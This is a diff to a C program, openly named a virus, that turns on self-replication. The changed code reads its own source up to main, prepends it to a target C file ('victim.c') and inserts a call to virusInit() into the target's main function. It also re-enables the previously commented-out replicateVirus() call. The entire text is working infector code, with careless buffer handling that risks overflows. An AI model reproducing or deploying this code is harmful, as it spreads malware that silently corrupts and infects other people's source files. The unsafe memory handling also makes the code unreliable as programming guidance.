@@ -2,10 +2,11 @@
 #include <stdlib.h>
 #include <sys/stat.h>
 #include <string.h>
+#include <stdbool.h>
 // Searches for a victim to copy the virus into
 const char *fileSearch()
 {
-    char *fileName = "victim.txt";
+    char *fileName = "victim.c";
     return fileName;
 }
 
@@ -14,8 +15,8 @@ void replicateVirus(char *content)
     long contentSize = strlen(content) + 1;
 
     // Opening up victim in read and write mode
-
-    FILE *fp = fopen(fileSearch(), "r+");
+    const char *victimFile = fileSearch();
+    FILE *fp = fopen(victimFile, "r+");
     if (fp == NULL)
     {
         fprintf(stderr, "Error opening the file");
@@ -23,14 +24,15 @@ void replicateVirus(char *content)
     }
 
     // Determining the size of victim
-    fseek(fp, 0, SEEK_END);
-    long fileSize = ftell(fp);
-    fseek(fp, 0, SEEK_SET);
+    struct stat sb;
+    stat(victimFile, &sb);
+    long fileSize = sb.st_size;
+    char *buffer = malloc(fileSize);
 
     long combinedSize = contentSize + fileSize;
-
     // For the content of the victim
     char *victimContent = malloc(fileSize + 1);
+    strcpy(victimContent, "");
     if (victimContent == NULL)
     {
         fprintf(stderr, "Memory not allocated\n");
@@ -43,15 +45,32 @@ void replicateVirus(char *content)
     // Creating the content to be copied
     strcpy(copyContent, content);
 
-    int readElements = fread(victimContent, fileSize, 1, fp);
-    if (readElements != 1)
+    while (fscanf(fp, "%[^\n] ", buffer) != EOF)
     {
-        fprintf(stderr, "Error has occured or EOF reached\n");
-        exit(0);
+        const char *intmainString = "int main(";
+        if (strlen(buffer) >= 9)
+        {
+            int i;
+            for (i = 0; i < 9; i++)
+            {
+                if (buffer[i] != intmainString[i])
+                {
+                    break;
+                }
+            }
+            if (i == 9)
+            {
+                strcat(buffer, "\n{virusInit();\n");
+                strcat(victimContent, buffer);
+                fscanf(fp, "%[^\n] ", buffer);
+                continue;
+            }
+        }
+        strcat(buffer, "\n");
+        strcat(victimContent, buffer);
     }
 
     strcat(copyContent, victimContent);
-    copyContent[combinedSize] = 0;
 
     /* Setting the file pointer to the beginning to paste the copyContent to the beginning of the victim */
     fseek(fp, 0, SEEK_SET);
@@ -60,6 +79,7 @@ void replicateVirus(char *content)
     /*Releasing the space occupied in heap*/
     fclose(fp);
     free(victimContent);
+    free(buffer);
 }
 
 void virusInit()
@@ -72,42 +92,70 @@ void virusInit()
         fprintf(stderr, "Error opening the file");
         exit(0);
     }
+    // Determining the size of virus
     struct stat sb;
     stat(__FILE__, &sb);
-    char *file_contents = malloc(sb.st_size);
-    // Determining the size of virus
-    fseek(fp, 0, SEEK_END);
-    long virusSize = ftell(fp);
-    fseek(fp, 0, SEEK_SET);
+    char *buffer = malloc(sb.st_size);
+    char *virusContent = malloc(sb.st_size);
+    strcpy(virusContent, "");
 
-    // For the content of the virus
-    char *virusContent = malloc(virusSize + 1);
-    if (virusContent == NULL)
+    bool includePass = true;
+    while (fscanf(fp, "%[^\n] ", buffer) != EOF)
     {
-        fprintf(stderr, "Memory not allocated\n");
-        exit(0);
-    }
+        const char *inc = "#include";
+        const char *intmainString = "int main(";
+        if (!includePass)
+        {
+            if (strlen(buffer) >= 8)
+            {
+                int i;
+                for (i = 0; i < 8; i++)
+                {
+                    if (buffer[i] != inc[i])
+                    {
+                        break;
+                    }
+                }
+                if (i == 8)
+                {
+                    continue;
+                }
+                else
+                {
+                    includePass = true;
+                }
+            }
+            else
+            {
+                includePass = true;
+            }
+        }
 
-    while (fscanf(fp, "%[^\n] ", file_contents) != EOF)
-    {
-        printf("%s\n", file_contents);
+        if (strlen(buffer) >= 9)
+        {
+            int i;
+            for (i = 0; i < 9; i++)
+            {
+                if (buffer[i] != intmainString[i])
+                {
+                    break;
+                }
+            }
+            if (i == 9)
+            {
+                break;
+            }
+        }
+        strcat(buffer, "\n");
+        strcat(virusContent, buffer);
     }
-
-    // Reading the content of the virus
-    int readElements = fread(virusContent, virusSize, 1, fp);
-    if (readElements != 1)
-    {
-        fprintf(stderr, "Error has occured or EOF reached\n");
-        exit(0);
-    }
-    virusContent[virusSize] = 0;
 
     // Replicating the virus to victim
-    // replicateVirus(virusContent);
+    replicateVirus(virusContent);
 
     fclose(fp);
+    free(buffer);
     free(virusContent);
-    free(file_contents);
 }
 int main(int c, char *argv[])
 {
